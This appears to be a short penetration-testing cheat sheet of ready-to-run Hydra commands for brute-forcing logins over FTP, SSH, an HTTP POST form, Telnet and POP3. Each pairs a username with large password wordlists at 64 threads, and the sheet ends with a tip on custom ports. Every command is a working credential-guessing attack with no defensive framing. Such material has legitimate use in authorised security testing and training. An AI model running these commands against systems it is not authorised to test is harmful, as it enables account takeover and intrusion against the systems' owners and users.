FTP
```
hydra -l user -P /usr/share/wordlists/rockyou.txt $ip ftp -f -W 5 -t 64
```

SSH
```
hydra -l user -P /usr/share/wordlists/rockyou.txt $ip ssh -f -W 5 -t 64
```

HTTP-POST
```
hydra -l user -P /usr/share/wordlists/rockyou.txt $ip http-post-form -f -W 5 -t 64 "/login.php:username=^USER^&password=^PASS^:<Login failed>"
```

TELNET
```
hydra -l user -P /usr/share/wordlists/rockyou.txt $ip telnet -f -W 5 -t 64
```

POP3
```
hydra -l user -P /usr/share/wordlists/fasttrack.txt $ip pop3 -f -W 5 -t 64
```

- You can specify a custom port for any protocol using the `-s` (port) flag